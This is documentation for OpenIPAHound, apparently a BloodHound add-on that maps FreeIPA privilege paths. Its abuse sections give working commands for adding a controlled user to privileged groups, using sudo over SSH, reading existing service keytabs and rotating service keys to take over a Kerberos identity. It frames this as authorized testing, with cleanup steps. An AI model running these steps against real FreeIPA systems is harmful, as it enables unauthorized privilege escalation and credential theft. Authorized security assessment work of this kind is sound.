# Nodes And Edges

OpenIPAHound adds FreeIPA objects and relationships to BloodHound. Traversable
edges can be used by BloodHound Pathfinding.

Only run the abuse examples in environments you own or have permission to test.
The commands use placeholder values like `user`, `group`, `ipa.example.test`,
and `dc=example,dc=test`; replace them with values from your environment.

## Nodes

- `IPA_Environment`: FreeIPA realm/domain metadata.
- `IPA_User`: FreeIPA user account.
- `IPA_Group`: FreeIPA user group.
- `IPA_Role`, `IPA_Privilege`, `IPA_Permission`: FreeIPA RBAC objects.
- `IPA_Computer`: enrolled FreeIPA host.
- `IPA_HostGroup`: FreeIPA hostgroup.
- `IPA_Service`: FreeIPA service principal.
- `IPA_CA`, `IPA_CertificateTemplate`: certificate and CA ACL context.
- `IPA_TrustedDomain`: AD trust context.
- `IPA_SELinux`: SELinux user-map context.

## Edges

| Edge | Pathfinding | Meaning |
| --- | --- | --- |
| `IPA_MemberOf` | Traversable | Principal or host is a member of a group-like object. |
| `IPA_HasRole` | Traversable | Principal or group has a role assignment. |
| `IPA_HasPrivilege` | Traversable | Role or principal reaches a privilege. |
| `IPA_ContainsPermission` | Traversable | Privilege contains a permission object. |
| `IPA_AddMember` | Traversable | Principal can add members to a group. |
| `IPA_CanSSH` | Traversable | Principal can SSH to a host when host-side conditions line up. |
| `IPA_CanSUDO` | Traversable | Principal can run sudo on a host. |
| `IPA_ReadKerberosKey` | Traversable | Principal can retrieve existing service key material. |
| `IPA_ForceChangePassword` | Traversable | Principal can create or rotate service key material. |
| `IPA_Owns` | Non-traversable | Managed-object context for follow-up research. |
| `IPA_AllowedToDelegate` | Non-traversable | Delegation target context for follow-up research. |
| `IPA_AddRBCD` | Non-traversable | Target-side resource delegation write context. |
| `IPA_Enroll` | Non-traversable | Certificate enrollment context. |
| `IPA_TrustedBy` | Non-traversable | AD trust context. |
| `IPA_DCSync` | Non-traversable | Replication-control context. |
| `IPA_CanHBACService` | Non-traversable | Non-SSH/non-sudo HBAC service context. |

## Quick LDAP Checks

Get a Kerberos ticket:

```bash
KRB5CCNAME=/tmp/user.ccache kinit user@EXAMPLE.TEST
KRB5CCNAME=/tmp/user.ccache klist
```

Inspect a user:

```bash
KRB5CCNAME=/tmp/user.ccache \
ldapsearch -LLL -Y GSSAPI -H ldap://ipa.example.test \
  -b uid=user,cn=users,cn=accounts,dc=example,dc=test \
  dn uid memberOf krbPrincipalName
```

Inspect groups and member managers:

```bash
KRB5CCNAME=/tmp/user.ccache \
ldapsearch -LLL -Y GSSAPI -H ldap://ipa.example.test \
  -b cn=groups,cn=accounts,dc=example,dc=test \
  cn member memberManager
```

Inspect HBAC rules:

```bash
KRB5CCNAME=/tmp/user.ccache \
ldapsearch -LLL -Y GSSAPI -H ldap://ipa.example.test \
  -b cn=hbac,dc=example,dc=test \
  cn ipaEnabledFlag memberUser memberHost memberService
```

Inspect sudo rules:

```bash
KRB5CCNAME=/tmp/user.ccache \
ldapsearch -LLL -Y GSSAPI -H ldap://ipa.example.test \
  -b cn=sudo,dc=example,dc=test \
  cn ipaEnabledFlag sudoUser sudoHost sudoCommand ipaSudoOpt
```

Inspect service key-control rights:

```bash
KRB5CCNAME=/tmp/user.ccache \
ldapsearch -LLL -Y GSSAPI -H ldap://ipa.example.test \
  -b cn=services,cn=accounts,dc=example,dc=test \
  krbPrincipalName ipaAllowedToPerform
```

## SSH And Sudo

Edges: `IPA_CanSSH`, `IPA_CanSUDO`

Abuse Info: a user or group that can SSH to a host and sudo on that same host
may have a Linux administration path.

Validate SSH:

```bash
KRB5CCNAME=/tmp/user.ccache \
ssh user@linux01.example.test 'hostname -f; whoami; id'
```

Check sudo:

```bash
KRB5CCNAME=/tmp/user.ccache \
ssh -tt user@linux01.example.test 'sudo -k; sudo -l'
```

If sudo is passwordless, test a small command:

```bash
KRB5CCNAME=/tmp/user.ccache \
ssh user@linux01.example.test 'sudo -n id'
```

If sudo asks for a password, use an interactive SSH session:

```bash
KRB5CCNAME=/tmp/user.ccache \
ssh -tt user@linux01.example.test 'sudo id'
```

Cleanup:

```bash
KRB5CCNAME=/tmp/user.ccache kdestroy
rm -f /tmp/user.ccache
```

Operational Notes:

- HBAC and sudo policy do not prove network reachability.
- SSH config, account state, SSSD cache, sudo command scope, and password
  prompts still matter.
- `sudo -l` tells you what sudo thinks the user can run; it is not the same as
  proving every command succeeds.

## AddMember To Host Access

Edge: `IPA_AddMember`

Abuse Info: if a principal can add members to a group, and that group has useful
downstream rights, the principal may be able to add a controlled user and
inherit those rights.

Add a controlled user to a group:

```bash
cat > /tmp/add-user-to-group.ldif <<'EOF'
dn: cn=group,cn=groups,cn=accounts,dc=example,dc=test
changetype: modify
add: member
member: uid=user,cn=users,cn=accounts,dc=example,dc=test
EOF

KRB5CCNAME=/tmp/user.ccache \
ldapmodify -Y GSSAPI -H ldap://ipa.example.test \
  -f /tmp/add-user-to-group.ldif
```

Refresh the user's ticket or login session:

```bash
KRB5CCNAME=/tmp/user.ccache kdestroy
KRB5CCNAME=/tmp/user.ccache kinit user@EXAMPLE.TEST
```

Test the inherited host access:

```bash
KRB5CCNAME=/tmp/user.ccache \
ssh user@linux01.example.test 'id; sudo -l'
```

Cleanup:

```bash
cat > /tmp/remove-user-from-group.ldif <<'EOF'
dn: cn=group,cn=groups,cn=accounts,dc=example,dc=test
changetype: modify
delete: member
member: uid=user,cn=users,cn=accounts,dc=example,dc=test
EOF

KRB5CCNAME=/tmp/user.ccache \
ldapmodify -Y GSSAPI -H ldap://ipa.example.test \
  -f /tmp/remove-user-from-group.ldif

KRB5CCNAME=/tmp/user.ccache kdestroy
rm -f /tmp/user.ccache /tmp/add-user-to-group.ldif /tmp/remove-user-from-group.ldif
```

If the host still shows old group membership, flush SSSD through an authorized
admin path and retest:

```bash
ssh -tt admin@linux01.example.test 'sudo sss_cache -E'
```

Operational Notes:

- The edge matters when the managed group has meaningful downstream rights.
- Membership changes may require a new ticket, new SSH session, or SSSD cache
  refresh.

## Tooling: ipa-getkeytab

The keytab examples use `ipa-getkeytab`, which ships with FreeIPA/IdM client
tooling, and may be installed on domain-joined hosts. If you wish to install it on a non-domain-joined attacker box, below are some instructions on how to do so. Installing the client tools is not the same as enrolling the machine;
enrollment happens when you run `ipa-client-install`. It is not advised to attempt to enroll an attacker box in a FreeIPA environment.

Common package names:

```bash
# RHEL, Rocky, Alma, and older CentOS-style systems
sudo dnf install ipa-client

# Fedora
sudo dnf install freeipa-client

# Debian, Ubuntu, and Kali where FreeIPA client tools are packaged
sudo apt install freeipa-client
```

On some systems the command is installed under `/usr/sbin`, so check both:

```bash
command -v ipa-getkeytab || ls -l /usr/sbin/ipa-getkeytab
ipa-getkeytab --help
```

If `kinit` or `klist` is missing, install the Kerberos user tools for your
platform as well, such as `krb5-workstation` on RHEL-family systems or
`krb5-user` on Debian-family systems.

Certain distros such as Kali may not have `freeipa-client` in its configured repositories. If you only
need `ipa-getkeytab`, download the Debian `freeipa-client` package for your
architecture and extract the tool instead of installing the whole package.
Debian package listings are available at
[packages.debian.org/freeipa-client](https://packages.debian.org/freeipa-client).
For Kali amd64, this Debian sid download page worked in testing:
[packages.debian.org/sid/amd64/freeipa-client/download](https://packages.debian.org/sid/amd64/freeipa-client/download).

Tested Kali version: `Linux kali 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64 GNU/Linux`

```bash
mkdir -p /tmp/freeipa-client-tools/root
cd /tmp/freeipa-client-tools

dpkg --print-architecture
```

Download the matching `freeipa-client_..._<arch>.deb` file into that directory,
then extract and test the binary:

```bash
dpkg-deb -c ./freeipa-client_*.deb | grep '/usr/sbin/ipa-getkeytab$'
dpkg-deb -x ./freeipa-client_*.deb ./root

./root/usr/sbin/ipa-getkeytab --help
ldd ./root/usr/sbin/ipa-getkeytab | grep 'not found' || true
```

If the help output works and `ldd` does not report missing libraries, install
the extracted tool somewhere in your path:

```bash
sudo install -m 0755 ./root/usr/sbin/ipa-getkeytab \
  /usr/local/sbin/ipa-getkeytab

hash -r
ipa-getkeytab --help
```

This only gives you the binary. You still need working Kerberos and IPA
connectivity: correct time, DNS or explicit `-s` server selection, realm config,
CA trust if required, and a principal with the right FreeIPA keytab permission.
If `ldd` reports missing libraries, install the normal Kali/Debian packages that
provide those libraries. For a more overkill option, `dpkg -i freeipa-client_*.deb` will install
the full FreeIPA client dependency tree on the your host.

## Read Existing Service Keys

Edge: `IPA_ReadKerberosKey`

Abuse Info: a principal with read-key rights can retrieve existing key material
for a FreeIPA service principal. The service must already have key material.
This gives a reusable Kerberos identity for that principal.

Retrieve the keytab:

```bash
KRB5CCNAME=/tmp/user.ccache \
ipa-getkeytab -r -s ipa.example.test \
  -p HTTP/web01.example.test@EXAMPLE.TEST \
  -k /tmp/http-web01.keytab
```

Use the service identity:

```bash
klist -k -e /tmp/http-web01.keytab

KRB5CCNAME=/tmp/http-web01.ccache \
kinit -kt /tmp/http-web01.keytab HTTP/web01.example.test@EXAMPLE.TEST

KRB5CCNAME=/tmp/http-web01.ccache klist
```

Cleanup:

```bash
KRB5CCNAME=/tmp/http-web01.ccache kdestroy
rm -f /tmp/http-web01.ccache /tmp/http-web01.keytab
```

Operational Notes:

- Read-key rights do not help if the service has no current key material.
- `kinit -kt` proves Kerberos authentication as the service principal, not
  control of the application behind that principal.
- FreeIPA stores keytab delegation as `read_keys` and `write_keys` operations on
  the target host or service principal. See
  [FreeIPA Keytab Retrieval](https://www.freeipa.org/page/V4/Keytab_Retrieval),
  [FreeIPA Keytab Retrieval Management](https://www.freeipa.org/page/V4/Keytab_Retrieval_Management),
  and
  [Red Hat IdM keytab documentation](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/9/html/managing_idm_users_groups_hosts_and_access_control_rules/assembly_maintaining-idm-kerberos-keytab-files_managing-users-groups-hosts)
  for the underlying model.

## Create Or Rotate Service Keys

Edge: `IPA_ForceChangePassword`

Abuse Info: a principal with write-key rights can create or replace key material
for a FreeIPA service principal. This can create a usable service identity, but
it can also break legitimate deployed keytabs.

Create or rotate the keytab:

```bash
KRB5CCNAME=/tmp/user.ccache \
ipa-getkeytab -s ipa.example.test \
  -p HTTP/web02.example.test@EXAMPLE.TEST \
  -k /tmp/http-web02.keytab
```

Use the new keytab:

```bash
klist -k -e /tmp/http-web02.keytab

KRB5CCNAME=/tmp/http-web02.ccache \
kinit -kt /tmp/http-web02.keytab HTTP/web02.example.test@EXAMPLE.TEST

KRB5CCNAME=/tmp/http-web02.ccache klist
```

Cleanup:

```bash
KRB5CCNAME=/tmp/http-web02.ccache kdestroy
rm -f /tmp/http-web02.ccache /tmp/http-web02.keytab
```

If this was a temporary service key, disable it according to your FreeIPA change
process:

```bash
ipa service-disable HTTP/web02.example.test@EXAMPLE.TEST
```

Operational Notes:

- Running `ipa-getkeytab` without `-r` can rotate or create key material.
- Rotating an existing service key can invalidate deployed keytabs until the
  service receives the new key.

## RBAC Expansion

Edges: `IPA_HasRole`, `IPA_HasPrivilege`, `IPA_ContainsPermission`, and
membership hops through `IPA_MemberOf`

Abuse Info: these edges explain why a principal reaches a FreeIPA role,
privilege, or permission. They are not generic LDAP-write abuse edges by
themselves. Use them to understand inheritance, then validate a specific
downstream action.

Inspect roles:

```bash
KRB5CCNAME=/tmp/user.ccache \
ldapsearch -LLL -Y GSSAPI -H ldap://ipa.example.test \
  -b cn=roles,cn=accounts,dc=example,dc=test \
  cn member
```

Inspect privileges:

```bash
KRB5CCNAME=/tmp/user.ccache \
ldapsearch -LLL -Y GSSAPI -H ldap://ipa.example.test \
  -b cn=privileges,cn=pbac,dc=example,dc=test \
  cn member
```

Inspect permissions:

```bash
KRB5CCNAME=/tmp/user.ccache \
ldapsearch -LLL -Y GSSAPI -H ldap://ipa.example.test \
  -b cn=permissions,cn=pbac,dc=example,dc=test \
  cn ipaPermRight ipaPermTarget ipaPermTargetFilter member
```

Operational Notes:

- FreeIPA permission objects can be broad or subtle. And will be a subject of future research to create traversable outbound edges.

## Research Edges

These relationships are collected for inspection, but are non-traversable by
default:

- `IPA_CanHBACService`: HBAC services other than SSH and sudo need
  service-specific interpretation before they become path edges.
- `IPA_AddRBCD` and `IPA_AllowedToDelegate`: delegation abuse depends on
  target-side delegation writes, source service identity control, and S4U target
  use.
- `IPA_Enroll`: CA ACL scope is not the same as fully validated PKINIT or
  service-certificate abuse.
- `IPA_Owns`: `managedBy` can mean different things for hosts and services.
- `IPA_DCSync`: replication-control paths involve high-impact secret material
  and environment-specific handling.
- `IPA_TrustedBy`: hybrid AD/IPA paths need native AD collection and explicit
  mapping between AD and FreeIPA policy.
